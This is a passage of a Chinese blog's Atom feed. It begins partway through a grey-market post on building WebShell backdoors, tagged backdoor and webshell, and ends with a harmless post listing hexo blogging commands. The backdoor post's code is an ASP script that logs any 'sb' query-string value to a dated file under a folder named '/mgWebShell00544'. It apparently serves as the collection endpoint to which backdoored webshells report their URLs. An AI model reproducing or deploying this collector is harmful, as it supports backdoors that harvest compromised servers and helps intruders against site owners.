class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;  &amp;lt;%&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Function WriteTxt(file,date)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  SitePath = Server.Mappath(&lt;span class=&quot;string&quot;&gt;&quot;/mgWebShell00544&quot;&lt;/span&gt;) &amp;amp; file&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  Set FSO=Server.CreateObject(&lt;span class=&quot;string&quot;&gt;&quot;Scripting.FileSystemObject&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  IF FSO.FileExists(SitePath) Then&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  Set MyFile=FSO.OpenTextFile(SitePath,8)&lt;span class=&quot;string&quot;&gt;&#39;打开文件&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  tmp = FSO.OpenTextfile(SitePath,1, False).Readall&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  If Instr(tmp, date) = 0 Then &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  MyFile.WriteLine(&quot;URL=&quot;&amp;amp;date)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  Set MyFile=Nothing&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  Set FSO=Nothing&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  Else&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  End If&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  Else&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  Set FSO=Server.CreateObject(&quot;Scripting.FileSystemObject&quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  Call FSO.CreateTextFile(SitePath, True)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  Set MyFile=FSO.OpenTextFile(SitePath,8)&#39;&lt;/span&gt;打开文件&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  MyFile.WriteLine(&lt;span class=&quot;string&quot;&gt;&quot;URL=&quot;&lt;/span&gt;&amp;amp;date)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  Set MyFile=Nothing&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  Set FSO=Nothing &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  End If&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;End Function&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;If Request.QueryString&amp;lt;&amp;gt;&lt;span class=&quot;string&quot;&gt;&quot;&quot;&lt;/span&gt; Then &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sb = Request.QueryString(&lt;span class=&quot;string&quot;&gt;&quot;sb&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Call WriteTxt(&lt;span class=&quot;string&quot;&gt;&quot;\&quot;&amp;amp;Month(now())&amp;amp;&quot;&lt;/span&gt;----------&lt;span class=&quot;string&quot;&gt;&quot;&amp;amp;Day(now())&amp;amp;&quot;&lt;/span&gt;.txt&lt;span class=&quot;string&quot;&gt;&quot;,sb)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;End If&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;%&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;  写这篇文章的目的很单纯!&lt;/p&gt;
&lt;h2 id=&quot;正文&quot;&gt;&lt;a href=&quot;#正文&quot; class=&quot;headerlink&quot; title=&quot;正文&quot;&gt;&lt;/a&gt;正文&lt;/h2&gt;&lt;p&gt;  好了，废话不多说，一个WebShell后门的必须条件有三个&lt;/p&gt;
&lt;p&gt;  1、1个域名&lt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>终于折腾完了!</title>
    <link href="http://0xmg.github.io/2016/06/12/%E7%BB%88%E4%BA%8E%E6%8A%98%E8%85%BE%E5%AE%8C%E4%BA%86!/"/>
    <id>http://0xmg.github.io/2016/06/12/终于折腾完了!/</id>
    <published>2016-06-12T07:52:26.000Z</published>
    <updated>2016-06-13T17:16:28.000Z</updated>
    
    <content type="html">&lt;p&gt;  从昨天早上折腾到晚上…其实早就配置好了，然后同步的时候一直提示公钥不正确，简直是气的发疯。。。然后我重启了一下笔记本一切ok了！。。。&lt;/p&gt;
&lt;h2 id=&quot;正文&quot;&gt;&lt;a href=&quot;#正文&quot; class=&quot;headerlink&quot; title=&quot;正文&quot;&gt;&lt;/a&gt;正文&lt;/h2&gt;&lt;p&gt;整理一下会常用到的命令&lt;br&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ hexo new &lt;span class=&quot;string&quot;&gt;&quot;My New Post&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ hexo server&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ hexo generate&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ hexo deploy&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;  从昨天早上折腾到晚上…其实早就配置好了，然后同步的时候一直提示公钥不正确，简直是气的发疯。。。然后我重启了一下笔记本一切ok了！。。。&lt;/p&gt;
&lt;h2 id=&quot;正文&quot;&gt;&lt;a href=&quot;#正文&quot; class=&quot;headerlink&quot; title=&quot;正文&quot;&gt;&lt;/a&gt;正文&lt;
    
    </summary>
    
      <category term="灰产" scheme="http://0xmg.github.io/categories/%E7%81%B0%E4%BA%A7/"/>
    
    
      <category term="后门,webshell,灰产" scheme="http://0xmg.github.io/tags/%E5%90%8E%E9%97%A8-webshell-%E7%81%B0%E4%BA%A7/"/>
    
  </entry>
  
</feed>
